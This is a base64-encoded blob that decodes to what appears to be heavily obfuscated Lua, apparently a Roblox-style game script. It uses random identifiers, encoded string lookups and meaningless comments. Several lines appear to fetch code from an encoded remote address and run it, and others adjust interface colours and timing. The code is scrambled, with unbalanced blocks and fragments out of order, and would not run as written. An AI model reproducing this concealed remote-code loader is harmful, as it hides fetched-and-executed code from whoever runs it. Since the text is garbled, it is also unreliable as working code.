R0byA9IGhuUVZRVUVuSXkoREtmS1JYaldSZTpJVXJ2Q01iTExTKCgoRnJsS01NT2l2YSlbInphUGJoVGhiUm4iXSgiaXhEQ0N0WkVoRCIpKSkpKCkKICAgIGlmIGV5aFdBT2lLd0kgdGhlbgpsb2NhbCBDd1RscEZRRHd0ID0gKChNbE9NTUlzWGpiKVsiemFQYmhUaGJSbiJdKCJmZlFIT0tyUGF2IikpCiAgICBZdUFtblFGRkZiID0gKChNUFpEYlFmT01KKVsiemFQYmhUaGJSbiJdKCJHUm91QWN1RUxjPT0iKSksCiAgICBvVGtLaVFtZkdsOldaYW1nRVpqSHMoCiAgICAgICAgICAgICAgICBpZiBjWFNEVXF3d2xELkdSemNtUnNpWEMgPT0gKChaS2JVTEx6Q1VuKVsiemFQYmhUaGJSbiJdKCJMUG5lekxPY0hoPT0iKSkgdGhlbgplbmQKbG9jYWwgdmJkdUViZ2RtYiA9CgotLSBjYnpGeGJmWE5yIEVTaFhIUnFIcEoga0hLWVZFRUZJYiBKbmtIdmRKa1ZPIGN0Y2ZScmtjUWsgZWFBcGtUcHpFWiBQc2VnZXhwZE1TCiAgICAgICAgICAgICAgICB4ZnphTUlWdm5COkRrRkh1cGhyS2soKQogICAgZ0RacWhUbXBxZwogICAgICAgICAgICAgICAgICAgIEFhd29jR2xNRWEuU2pSZ3JiUG1May5YbUhydlN3S1VJID0gcm9pS1lrclhIdC5RYll5RXJBY2xLCmVuZAogICAgICAgICAgICAgICAgICAgIE5zamlpc1FGTlguT0xMS3ZXZWFPdi5YbUhydlN3S1VJID0gQ3dUbHBGUUR3dAogICAgaGNTdlpMY0N3UyA9IE5zamlpc1FGTlg6Wndvb1NpalVISygoKGpLcFhDUEVzWGwpWyJ6YVBiaFRoYlJuIl0oIkpsTW1MdE9uV0I9IikpKSBMenVvY1ZEc0dyIE5zamlpc1FGTlguYlRkZ0htRVVpTC5YbUhydlN3S1VJIEpkbGxkZkZ5d1ggbmlsCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBpZiB5SllHZFZqemVHLnZVeVZaVFBoRGUob2NMd3dTYkZ3diwgWFVEbmVUeWNzay5VdVdLSEJxbEJlKSA9PSBuaWwgdGhlbgotLSBUSmRHU25WaGpKIG9jTHd3U2JGd3Ygc29mRGRPRU9ZZSBSTEZoQnNKelZVCiAgICAgICAgICAgIENaeE11eUl6QW8uekhMVUdTdmx0ZCA9IG5pbAogICAgICAgICAgICBLa3pPaVNCanNsLkhXdnFFVmlIbU06QlNpRG1TS0hTcygoKEFheGVCSm5zeGspWyJ6YVBiaFRoYlJuIl0oInlSRmZSek5ReXQ9IikpKS5WTENTTHdJbmRKID0gMAoKICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKDAuMSkKICAgICAgICBsb2NhbCB1TktOc0Zma2FyID0gVFhIa1VGS2pIVTpad29vU2lqVUhLKCgocnlDQlhkRVVEZilbInphUGJoVGhiUm4iXSgicWd6dEVyQUpsbSIpKSkKICAgICAgICBOUVpVSFBXRE1vID0gZnVuY3Rpb24oKQoKICAgICAgICAgICAgICAgICAgICAtLSBLSm9qcURQZmJxIFpzWEhrdFBEaXIgamxoQ1hlQmR3UiBaTVZ1RlRaZmtxLCBac1hIa3RQRGlyIFpNVnVGVFpma3EgcEhTdllyUFZYYiBJYWxqRXVtVEd5IEdVc05aeXBNSXIKICAgICAgICBLa3pPaVNCanNsLmtobllXZ0NvUkc6a2phcWp6RG5CbCgKICAgICAgICAgICAgZ0RacWhUbXBxZwogICAgICAgIGxhd2tXQVZVaFogPSAoKGtqb1J0RE1hRXgpWyJ6YVBiaFRoYlJuIl0oImZaWVBESGRTSEQiKSksCiAgICAgICAgICAgIGVuZAogICAgICAgIGxhd2tXQVZVaFogPSAoKFRoTHJoUE9MRFcpWyJ6YVBiaFRoYlJuIl0oInhKSnRJYkdueW89PSIpKSwgLS0gTWNyVk5BUmtsSSBLcXBuY0JGQ3lvCiAgICB9CiAgICAgICAgICAgICAgICAgICAgQWF3b2NHbE1FYS5TalJncmJQbUxrLmx6YnFMV3htUWggPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMTkwLCAxNzAsIDIzMCkKbG9jYWwgd0VFUE5ocktHdyA9IFdwcVVYZmdKWEw6Wndvb1NpalVISygoKFZJYm5ybUlWWkwpWyJ6YVBiaFRoYlJuIl0oIlBjVVpUZnluTUc9IikpKTpCU2lEbVNLSFNzKCgoQlJZSWJ5VHpoQilbInphUGJoVGhiUm4iXSgieUdpRmJJeG1jdyIpKSk6QlNpRG1TS0hTcygoKFBtdUREblplT00pWyJ6YVBiaFRoYlJuIl0oIlhBQlhmcU1KWEI9PSIpKSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICBsb2NhbCBmdW5jdGlvbiByV2RNektxRlRqKCkKICAgICAgICAgICAgb2pJV2Z6UmF4RihzVFBPaG1nSWFGKQogICAgICAgIGVuZApsb2NhbCBjSG1DV0ZNU2VUID0gZmFsc2UKCiAgICAgICAgICAgICAgICBpZiBxc2xHQnNIR0JWIExmdnJMSHVGaFUgdGhlbgogICAgICAgIHZHTGxCeldnQ2ogPSAoKFFTTEhlS0p6VU0pWyJ6YVBiaFRoYlJuIl0oIlh6ZWdmZ3NrRUk9PSIpKSwKICAgICAgICAgICAgcmV0dXJuCkxsbWlaY2VOd0g6Ull3QWJERmZpSSgKICAgICAgICAgICAgZW5kCiAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBmdUZUc3JFS1kucml4TExnV3BScihUTEhXcVRueUZKLmtFZWFNTnJXRlgoa2JXRUJhaXRQRy5wVk1pa0dPWERRLlRHbk5ReFdqV3IsIDAuMTUsIDAuODUpLCBrYldFQmFpdFBHLmlkVVJYcGFVa28uVEduTlF4V2pXcikKICAgICAgICAgICAgICAgIFRYSGtVRktqSFU6QlNpRG1TS0hTcygoKFZJYm5ybUlWWkwpWyJ6YVBiaFRoYlJuIl0oIlBjVVpUZnluTUc9IikpKTpCU2lEbVNLSFNzKCgoYnN5bHNOVHBIbClbInphUGJoVGhiUm4iXSgiUGRXeWpWanBFST09IikpKTpCU2lEbVNLSFNzKCgoUkJJSFBHanlmVClbInphUGJoVGhiUm4iXSgiVUFhdkZqaUFKdyIpKSk6QlNpRG1TS0hTcygoKFJCSUhQR2p5ZlQpWyJ6YVBiaFRoYlJuIl0oIlVBYXZGamlBSnciKSkpOkJTaURtU0tIU3MoCiAgICAgICAgICAgIG9Ua0tpUW1mR2w6b3BXcHhOSnhRaih7CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIHlKWUdkVmp6ZUcuU1RCYkhCZ2ZLSyhhdFBwWm96SlpnLCAxLCBYVURuZVR5Y3NrKQogICAgaXRKbkl3Y2ZDWi51dlFiclBUSVlsID0gdHJ1ZQogICAgICAgICAgICBpZiB3U1FPaVBjSGtJIEx6dW9jVkRzR3IgV3FCV1V2anJIUyB0aGVuCiAgICB9CgpRbkxYaVZWT1VqLk1JeUZDeVd5Sk86VnBjT25LdVdKTygKICAgICAgICB2R0xsQnpXZ0NqID0gZmFsc2UKICAgICAgICAgICAgSEdJclF2ek95dS5BYXdvY0dsTUVhLkRJbmdqS01vWFYuZWtxd0dwakR1YSA9IHRydWUKLS0gWlZBbmptZGdYeSBjQnVSc2NNU3BEClFuTFhpVlZPVWouSGR0b0NwdUp4QzppdlVySlh3a25aKCgodHZpTkpXamxXdClbInphUGJoVGhiUm4iXSgicG1mb0dMaXNReSIpKSwgewogICAgICAgIGVuZAoKICAgIGh4Z0lVeUNVc08gPSBmYWxzZSwKICAgICAgICAgICAgICAgIERLZktSWGpXUmU6U2NTRGlEdU9acygoKHViamxsZ2pGeFEpWyJ6YVBiaFRoYlJuIl0oIlpWRVFVRnNmREY9IikpKTpCU2lEbVNLSFNzKCgoZUh6QVBFTlNxQylbInphUGJoVGhiUm4iXSgiVVllZkd6WWpCVCIpKSk6QlNpRG1TS0hTcygoKE1CTW5kUURjd00pWyJ6YVBiaFRoYlJuIl0oIkRDYkFCQVptdUw9PSIpKSk6RGtGSHVwaHJLaygpCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoU2x0eFVtV014YilbInphUGJoVGhiUm4iXSgiUlZHcm9xT3BiaiIpKSwKbG9jYWwgVXVtaFhUdU5IbCA9ICgoYUlOV3FZUUdwSClbInphUGJoVGhiUm4iXSgiWXNvWUlKWlBFVD0iKSkgLS0gUkl4S1FVYm1GeiAoKE9RdkhmaEFPblYpWyJ6YVBiaFRoYlJuIl0oIlB3TEFCQUlCQ2I9PSIpKSwgV3FXZ3VweWVGaCB3WVVrR3dsVEpzIEp2dHRjdElkWmQKICAgIGxvY2FsIFBZV2lETFlkUEMgPSBXcHFVWGZnSlhMOkJTaURtU0tIU3MoKChya1F0VXFmZkxRKVsiemFQYmhUaGJSbiJdKCJmaWhFZGNJcElOPSIpKSwgNSkKICAgICkKCgpsb2NhbCBLa3pPaVNCanNsID0gaUxuR3hkZGhBai5La3pPaVNCanNsCiAgICBpdEpuSXdjZkNaLnhCbXBxcktsbEsgPSB6dkJ4TnZyVnNWCgplbmQKICAgIGVuZAogICAgICAgIGdEWnFoVG1wcWcKbG9jYWwgRVNoWEhScUhwSiA9IFFuTFhpVlZPVWoucUt3VWFpVmpzSTpmSVdEQU9wQnhGKCgob2JPTUViWmF3RClbInphUGJoVGhiUm4iXSgiYmpDTGtkeXl5dj09IikpKQogICAgICAgIGlmIHdTUU9pUGNIa0kgdGhlbgogICAgZW5kCmxvY2FsIEhHSXJRdnpPeXUgPSBLa3pPaVNCanNsOkJTaURtU0tIU3MoKChsT3ZUenBncnZPKVsiemFQYmhUaGJSbiJdKCJsUXFWYXh0UHJaIikpKQogICAgICAgIGlmIEFEQ25TR25ydFEuVXVXS0hCcWxCZSA9PSBOZ21wZmR5S2dKIHRoZW4KICAgICAgICAgICAgd0hEbURTUGF3UihoVU9qdVR3T2pPKQogICAgICAgIGlmIFJNV1dLZldtTXouR0RzWGxqb1ZzTC53U1FPaVBjSGtJID09IHRydWUgdGhlbgogICAgICAgICAgICBHQ0JaSE9wcE15LnhCbXBxcktsbEsgPSBuaWwKLS0gUmdNUFFod0NNZS5zakhlcEFKTUF5ID0gMQoKV01PamdtWGxXSC5VdVdLSEJxbEJlID0gKChzVll3WlZ0WEtWKVsiemFQYmhUaGJSbiJdKCJXZVBseXpsc3hnPSIpKQogICAgICAgICAgICAgICAgWmx3YXJSb25pVihJSHZ0bmdMT2ZSKHBSenFMYlRMakkpIC4uICgobkZOWmNvcVZtcSlbInphUGJoVGhiUm4iXSgiaXhlSXRBd1Jubz0iKSkgLi4gSUh2dG5nTE9mUihYVURuZVR5Y3NrKSkKCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICBpZiBIV3ZxRVZpSG1NIEx6dW9jVkRzR3IgSFd2cUVWaUhtTTpad29vU2lqVUhLKCgoUUpVUFVZQmlTSilbInphUGJoVGhiUm4iXSgiY1BjbmZ2VHlWRT09IikpKSB0aGVuCiAgICAgICAgICAgICAgICBnRFpxaFRtcHFnCiAgICBzR0tZWlJPUkhtOnZOZ010ZlB3VngoCgogICAgICAgICAgICAgICAgICAgICAgICBsaWh3Qnl0Tmp4Okx0QmlneVNJWlcoKQogICAgICAgICAgICAgICAgdkdMbEJ6V2dDaiA9IEN3VGxwRlFEd3QsCiAgICAgICAgICAgIC0tIFB1alNNcXdyQks6IEtKb2pxRFBmYnEgbVVTeGVWa25GSCBuZkFGTE50U0JBIGdzYVpWTklwS24gbnB5ZlJmTGprSi1ucHlmUmZMamtKIHRPSkJjbHVibUEKLS0gfQogICAgICAgICAgICAgICAgICAgICAgICBtT3RXRlBOSmpTID0gbVZiam1meWRWbS54aFRvZ2plaWZoKGp3UXh4Slhob20uaElDckFaVXFsZCArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgwLCA1MCwgMCkpCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoQVNtZXVqd09yVilbInphUGJoVGhiUm4iXSgiY3ZkRnFlTk5Wcz09IikpLAotLSBSZ01QUWh3Q01lLkxJQnZpa0p2a1ggPSBQZnVGVHNyRUtZLnhoVG9namVpZmgoMCwgMjQsIDAsIDI0KSAtLSBwVVBGUnhDaUxlIFBSUmRJdlZseGwgUnlPSVpDVEJ3VAogICAgREdWbmtOaWtoUyA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7bGF3a1dBVlVoWiA9ICgoaHRjbEpBalhxUilbInphUGJoVGhiUm4iXSgiZkZsa3Fpd2tDVSIpKSwgeFJqWUFva3VhaSA9ICgoT2tlR1B2VGVKbClbInphUGJoVGhiUm4iXSgid0JFcHJCUGttWCIpKX0pLAogICAgewogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHRIZW92aEprUkEpCiAgICAgICAgICAgIFpacnZpWExjQUwoKChEV1lGSU9LV0d2KVsiemFQYmhUaGJSbiJdKCJPVnphZ2VnbUNhPT0iKSkpCiAgICBRbkxYaVZWT1VqLkRHVm5rTmlraFM6aXZVckpYd2tuWigKICAgIGxhd2tXQVZVaFogPSAoKERzdm90Z1FSdXQpWyJ6YVBiaFRoYlJuIl0oIm9SQ0ZDWm9URG09IikpLAogICAgICAgIExJQnZpa0p2a1ggPSA1MCwKKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBkR2ZwVVpJREVGIEN6d3hVb2haWE8gPT0gKChCQkhpWFlCbk5BKVsiemFQYmhUaGJSbiJdKCJoUHpydFV2WnBGPSIpKSBwWWlpV1pHVUJyCiAgICAgICAgICAgICAgICBNcVlveERvc0pHID0gKChYYXNjSGtNWndaKVsiemFQYmhUaGJSbiJdKCJkcklnTFpjR0lGPSIpKSwKICAgIGVuZAogICAgICAgICAgICAgICAgSk5KVWhZQ3lNVS5XRkp4cVVPVW9uID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICBxcUxhVU1lbmlwID0gb2NMd3dTYkZ3diwKCikKICAgICAgICBsb2NhbCB0bHR1UmxyenNhID0ge30KCmxvY2FsIGNHU3FIbEhSeW0gPSBuaWwKICAgICgoT2p5dkRpRVFwcClbInphUGJoVGhiUm4iXSgiTGpib0dHa1JtVCIpKSwKUUVxYUFMSGR1cyA9CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEtraGxadmxRc0MgPSBibWpCQ0J4WENyOlp3b29TaWpVSEsoKChPaUtoaFFDVWZvKVsiemFQYmhUaGJSbiJdKCJhT2FHdWRUclhRPT0iKSkpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICgoQWJCTWR5WGpHRilbInphUGJoVGhiUm4iXSgiS3p5bE5UQnhlaj09IikpCmxvY2FsIGZ1bmN0aW9uIHJlV1NDUkdPZnMoaXNKYWtTdEdoQikKICAgICAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygwLjUpIC0tIG5veWVUc0RyaFggRkdOS2ZaRlJDaSBLb0Z1bE9zeG5uIExZaEJYTlZ5QVEgSHpVUFNOeHZjQQogICAgICAgIGdEWnFoVG1wcWcKICAgICAgICAgICAgICAgICAgICAtLSBYRmxXZkl3UkN2IFdORXNHeGhNckEgZWdvelZCQUpVdAogICAgICAgICAgICBlbmQKICAgICgoakRRRmJFYmtQaylbInphUGJoVGhiUm4iXSgiYkFDVkV4a3NGbSIpKSwKICAgIGl0Sm5Jd2NmQ1ouYWtSQm1wRldIdiA9IGFrUkJtcEZXSHYuQWd1ZlpzYVRCeSgyNTUsIDI1NSwgMjU1KSAtLSBJa013bHBRQlZuIGtzU2pjenlWV2EKUW5MWGlWVk9Vai5NSXlGQ3lXeUpPOlZwY09uS3VXSk8oCgogICAgewplbmQKZW5kCgogICAgZW5kCmxvY2FsIGlMbkd4ZGRoQWogPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChrQmRhRU9hZHNCKVsiemFQYmhUaGJSbiJdKCJycVNqellZSE5HPT0iKSkpCiAgICAgICAgICAgIFhaVFNQQnpVVk8gTXBLYW1WR21YaiwgWFVEbmVUeWNzayBtdHBkQ0VjRURqIEFHV2ZlUlNSQkssIERLZktSWGpXUmU6eGNwUVJKQ2pmTigpIHBZaWlXWkdVQnIKKQogICAgICAgICAgICAgICAgYW9lQ250Vml5cS5tdFlNQ1pLZ2ZBKGZ1bmN0aW9uKCkKLS0gRnJHeE13aHhnWiBrSEtZVkVFRkliIFpaZFVZenZRZXEgZWFBcGtUcHpFWiBQc2VnZXhwZE1TCiAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBYbURweEJFd3pxIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCn0pCiAgICAgICAgICAgIGtVeFdrVUdnVHEoKChzbERZZ1ZMcUJTKVsiemFQYmhUaGJSbiJdKCJnZm1VcGxSemprPSIpKSwgKCh2QWt2VE1IVGh1KVsiemFQYmhUaGJSbiJdKCJSYkVmQUVpbllKPT0iKSksIDMpCiAgICAgICAgICAgIC0tIG9oVVJLTWpyRWcgaVlUT3NUd0JERCBiRnpwZ1BTZ1VEIHRlU2N3Q0dscE0gUVhDY2ZvdmxXRwogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgcEZkek1hbGJMdy52TmlEcFRlZmRuID0gKChQRVNZcURrbFppKVsiemFQYmhUaGJSbiJdKCJvWlhYeHNZWG13IikpIC0tIGplTlB1T3hBbUUgY3RjZlJya2NRayBzcWVWVFlheWp1IHpwS2J5UW1qb2wKICAgICAgICBsb2NhbCBzTmZaamFEQkJ0ID0gSVdESlBDZGd2Ry5QUVVFaVJCc3dqOmtqYXFqekRuQmwoZnVuY3Rpb24oKQogICAgSEdJclF2ek95dS5DRXhrZ1JuRFRFOmtqYXFqekRuQmwoCiAgICAgICAgICAgICAgICAgICAgLS0gR2V1d3ZYVHdNTiB3b2VSVFlMZnhUIGtIS1lWRUVGSWIgQXVtVmZiemZOeCB2RmlrTWdlU1RPIG1DbkhDWHZIZHQKICAgICAgICAgICAgICAgICAgICAgICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBMeGp2SnV5VGRXIG10cGRDRWNFRGogeWh6VFVjQ1lmTyhXeVpRVUFTeUd4OkVhdE9pZlhMWlUoKSkgcFlpaVdaR1VCcgotLSBtRnlWTmFPUUNKIGtIS1lWRUVGSWIgUFFRZE9ZanlMZSB1dkJta0RtbGlDIFRraVpTaWtRdUMgSEZsUmJMUUxYWCB3T01TYWNRUHdzLCBMSkVnU1ZnZ01VLCBIWnlIV3pJYlB2IHV2Qm1rRG1saUMKICAgICAgICAgICAgICAgIGVuZAogICAgICAgIGlmIEhHSXJRdnpPeXUgTHp1b2NWRHNHciBIR0lyUXZ6T3l1Olp3b29TaWpVSEsoKChCUmpxT0VHd2NEKVsiemFQYmhUaGJSbiJdKCJOQlhrem1XRFZyIikpKSBMenVvY1ZEc0dyIEhHSXJRdnpPeXUuQWF3b2NHbE1FYTpad29vU2lqVUhLKCgoYVNaZ3NSYlBybSlbInphUGJoVGhiUm4iXSgid1BwRE5oQ1FJUz0iKSkpIEx6dW9jVkRzR3IgSEdJclF2ek95dS5BYXdvY0dsTUVhLkRJbmdqS01vWFY6Wndvb1NpalVISygoKGNSUFV2ZE9FWWYpWyJ6YVBiaFRoYlJuIl0oIktCT3dxb2lxd0Y9PSIpKSkgdGhlbgogICAgICAgIGlmIHp5Wk1WblFHdUYgdGhlbgogICAgICAgICAgICAgICAgREtmS1JYaldSZTpTY1NEaUR1T1pzKCgodWJqbGxnakZ4USlbInphUGJoVGhiUm4iXSgiWlZFUVVGc2ZERj0iKSkpOkJTaURtU0tIU3MoKChlSHpBUEVOU3FDKVsiemFQYmhUaGJSbiJdKCJVWWVmR3pZakJUIikpKTpCU2lEbVNLSFNzKCgoS1VXVWJyQ3V6dSlbInphUGJoVGhiUm4iXSgiWlhZVUdUZkVMTT09IikpKTpEa0ZIdXBocktrKCkKICAgIGZ1bmN0aW9uKCkKICAgIGVuZAogICAgICAgICAgICAgICAgaWYgdEhlb3ZoSmtSQSB+PSAoKGN0eFh2QlduR2gpWyJ6YVBiaFRoYlJuIl0oKChSY2NnQmtCUVhzKVsiemFQYmhUaGJSbiJdKCgoVHN1eWF0TXBSUilbInphUGJoVGhiUm4iXSgoKHpFRUN5T2VORUMpWyJ6YVBiaFRoYlJuIl0oKChIYlFUbHpqU29KKVsiemFQYmhUaGJSbiJdKCgoRlZMbXJxUVRKYSlbInphUGJoVGhiUm4iXSgoKE5GbEdDVFF6eXEpWyJ6YVBiaFRoYlJuIl0oIiIpKSkpKSkpKSkpKSkpKSBMenVvY1ZEc0dyIE5zamlpc1FGTlg6Wndvb1NpalVISygoKFhVVW5lYXlmSGcpWyJ6YVBiaFRoYlJuIl0oInpUR0pnem1kUHk9PSIpKSkgdGhlbgogICAgICAgICAgICBpZiBzVFBPaG1nSWFGOlZ3SXZoRXdOS3YoKChsU3N5QlJCZmZOKVsiemFQYmhUaGJSbiJdKCJHaFRwbWdmUExIPSIpKSkgdGhlbgogICAgaWYgd2V0QkZCanVGeiBMenVvY1ZEc0dyICN3ZXRCRkJqdUZ6ID4gMCB0aGVuCmVuZAogICAgZFJnZEt4a1RiTSA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7IGxhd2tXQVZVaFogPSAoKGJzQVlJelJxbEIpWyJ6YVBiaFRoYlJuIl0oImZzYkh4TVJLYmYiKSksIHhSallBb2t1YWkgPSAoKE9IZUtnbGdyS24pWyJ6YVBiaFRoYlJuIl0oIm1Db1ZiVWF1T2oiKSkgfSksCiAgICAgICAgICAgICAgICBiU2V5anl3ZEVPKFRMSFdxVG55RkouZmREWE1helRZaSgwLjEsIDAuMykpCgogICAgICAgICAgICBlbmQKICAgICAgICBzc2JGQUttbUlDLkxJQnZpa0p2a1ggPSByZVdTQ1JHT2ZzKDAuMTUpCgpwRmR6TWFsYkx3LlFDeXpsWExhemogPSB0cnVlIC0tIENnTm9ucEdieFIgYWtPdmlhU1p3TwogICAgICAgICAgICAgICAgKQpsb2NhbCBDeEFObFFGcWdCID0gS2t6T2lTQmpzbC5IV3ZxRVZpSG1NIEpkbGxkZkZ5d1ggS2t6T2lTQmpzbC5raG5ZV2dDb1JHOk93SkRZVFd3UWIoKQogICAgbGF3a1dBVlVoWiA9ICgoTlZ0ZnRORU5ZYylbInphUGJoVGhiUm4iXSgicUVod1FEVkp1VSIpKSwKICAgICAgICAgICAgICAgIEZnTG5WeElla3Mucmt3cG9OSFRheSA9IGFrUkJtcEZXSHYuQWd1ZlpzYVRCeSgyNTUsIDI1NSwgMjU1KQoKICAgICAgICAgICAgICAgIGlmIEFhd29jR2xNRWE6Wndvb1NpalVISygoKHBlS1hNRnBCVVIpWyJ6YVBiaFRoYlJuIl0oIk9XdWRyRWJkQ009IikpKSBMenVvY1ZEc0dyIHJvaUtZa3JYSHQudXNBUkJ0dGppaSB0aGVuCgp9KQogICAgICAgIC0tIEtlWUpDdWxybnMgYUxKVXhGbFNzWSAzIHJGSUJjb3JkWEIgb01FeXZ1RllIbiBEbXZ0TExMTEpyIFBaZ3NXeWd2RXEgUmFZR2lFelhwSSBhY0hpa1RrY3laIGtzYmRaeVp0UXAKLS0gWmFHUFlkZmhIUiBrSEtZVkVFRkliIHFLd1VhaVZqc0kgSkphcVhySWdHViBPWkVFd0VyVVFmCi0tIFpkQmVGallwWngga0hLWVZFRUZJYiB1RnpsVXRhUEJQIFp5VWlCdWdEdHAKICAgICAgICBsYXdrV0FWVWhaID0gKChGUHRrdVBBWHdRKVsiemFQYmhUaGJSbiJdKCJhdlRSd2JZZ3VpIikpLAoKKQoKICAgICAgICBlbmQKbG9jYWwgcGNYbFNEbUpMRyA9IGN5WVV3UVpMeXkgTHp1b2NWRHNHciBjeVlVd1FaTHl5OnlQU212RFpETGMoKChBYXhlQkpuc3hrKVsiemFQYmhUaGJSbiJdKCJ5UkZmUnpOUXl0PSIpKSkKWFVCQm5rQUV6dy54SW1qV2dQTHBZID0gdHJ1ZQogICAgICAgIGVuZAogICAgICAgICAgICAgICAgZ3ZoZWpmTnZEaCBjWFNEVXF3d2xELkdSemNtUnNpWEMgPT0gKChFdGxlQVppclNWKVsiemFQYmhUaGJSbiJdKCJWb1prcVVwcElZIikpIHRoZW4KICAgICAgICBpZiBKemp6ZnFoeXhMIHRoZW4KICAgICAgICAgICAgZEdmcFVaSURFRiBjSndGYVNZTG1aIHBZaWlXWkdVQnIKICAgIGVuZAogICAgICAgIHhIbGV5Q1NDQXkudElxcEpWUE5WdSA9IHRydWUKIHRoZW4KICAgICAgICAgICAgbG9jYWwgc05vZWh1TWRhUyA9IEtwQklhc2NnTEYoKCh1UnRlbGNTcUNaKVsiemFQYmhUaGJSbiJdKCJYZnZvWm1qbk1hPT0iKSkgLi4gYUJRZVhzZHJrdikKICAgICAgICBkR2ZwVVpJREVGIHRydWUgcFlpaVdaR1VCcgogICAgICAgICAgICBLbEdFaVBvTk9JLnhCbXBxcktsbEsgPSBUWEhrVUZLakhVCiAgICBxcUxhVU1lbmlwID0gZmJUdWFaSlhoQywKICAgICAgICBpZiBQek9mZkVwemJqLlV1V0tIQnFsQmUgPT0gKChiQ0xTa25FV1BPKVsiemFQYmhUaGJSbiJdKCJMYm12d1dUcUtaIikpIEx6dW9jVkRzR3IgUHpPZmZFcHpiai54Qm1wcXJLbGxLIEx6dW9jVkRzR3IgUHpPZmZFcHpiai54Qm1wcXJLbGxLLlV1V0tIQnFsQmUgPT0gKChYdW5xdUdjYnJiKVsiemFQYmhUaGJSbiJdKCJuYWRDUWNjWmdVIikpIHRoZW4KICAgICAgICAgICAgaWYgTnNqaWlzUUZOWDpad29vU2lqVUhLKCgoa2pZckRBZG1CbSlbInphUGJoVGhiUm4iXSgiVGJ1V21MWmZVUCIpKSkgdGhlbgogICAgZnVuY3Rpb24odEhlb3ZoSmtSQSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbUVuSEVnT0ptWiA9PSAoKEFUdGxNQWJrSncpWyJ6YVBiaFRoYlJuIl0oIm9Tc21oZGFFV2MiKSkgdGhlbgogICAgfQogICAgICAgICAgICAgICAgaWYgd3laZVlYWG1IViBMenVvY1ZEc0dyIG1iZU9acEV3WHkgfj0gbmlsIHRoZW4KbG9jYWwgVG9lTklKamJTRSA9IFFuTFhpVlZPVWouWnpUQWlYZ2RvbjppdlVySlh3a25aKCgoTWhiUWlteEdxcylbInphUGJoVGhiUm4iXSgicGZFSEVtR3Z4az0iKSksIHtsYXdrV0FWVWhaID0gKChjWVN3UkhES3NJKVsiemFQYmhUaGJSbiJdKCJkenJiV1pieE1VIikpLCB2R0xsQnpXZ0NqID0gZmFsc2V9KQotLXZ2a0ZoRXJibW4gRXhBZUtzR2dBUiBwcG5oYW5lQ1dNLS0tCiAgICAgICAgREtmS1JYaldSZS5pTG5HeGRkaEFqLktrek9pU0Jqc2wuSFd2cUVWaUhtTS54SGxleUNTQ0F5OkNLWmNmWUpxanQoUm1Gc3hWcnhXcCkKICAgICAgICAgICAgICAgIGVuZAplbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIFB6T2ZmRXB6YmouWWZ1d3JhZFR4eiA9IHRIZW92aEprUkEKCmxvY2FsIEZ1VWpuQmtYZ1cgPSBFU2hYSFJxSHBKOlZJSGNZWlNSdkIoKCh4TUxVT2VKQ2pmKVsiemFQYmhUaGJSbiJdKCJ5Um50d3hsRnlRIikpLCB7CgogICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBMeGp2SnV5VGRXIG10cGRDRWNFRGogeWh6VFVjQ1lmTyhUWEhrVUZLakhVOnhjcFFSSkNqZk4oKSkgcFlpaVdaR1VCcgogICAgICAgICAgICBpZiBOc2ppaXNRRk5YOlp3b29TaWpVSEsoKChYVVVuZWF5ZkhnKVsiemFQYmhUaGJSbiJdKCJ6VEdKZ3ptZFB5PT0iKSkpIHRoZW4KICAgICAgICAgICAgZW5kKQpYVUJCbmtBRXp3LmhJQ3JBWlVxbGQgPSBQZnVGVHNyRUtZLnhoVG9namVpZmgoMC41LCAwLCAwLjUwLCAwKSAtLSBsWnZReFZlVGduIFBBVmdNeVJvakQgckZJQmNvcmRYQiBzc2JGQUttbUlDCiAgICAgICAgICAgICAgICBJVm9pd3R0SFVkLkVpWGxmckJIY246T3dKRFlUV3dRYigpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChvZ05qbXVkaXhGKVsiemFQYmhUaGJSbiJdKCJCSmV3cGpFeWRGPT0iKSkpCiAgICAgICAgICAgICAgICBpZiBwQ253RGVnS1FuIHRoZW4KICAgICAgICAgICAgICAgIFhaVFNQQnpVVk8gcFJ6cUxiVExqSSwgWFVEbmVUeWNzayBtdHBkQ0VjRURqIHloelRVY0NZZk8oQ3hBTmxRRnFnQjp4Y3BRUkpDamZOKCkpIHBZaWlXWkdVQnIKCmxvY2FsIER0cFZObGFsckkgPQogICAgICAgIGxvY2FsIGZvemFIUGxFSVcgPSBxQUFDeGVwY0JBKCkKSmttdXlwUEVqUiA9IGhuUVZRVUVuSXkoREtmS1JYaldSZTpJVXJ2Q01iTExTKCgoZWFGQXdKVFhySSlbInphUGJoVGhiUm4iXSgiY1pEaHBjdUtSbD09IikpKSkoKQoKICAgIH0KbEtncUdoRXNSTzpSWXdB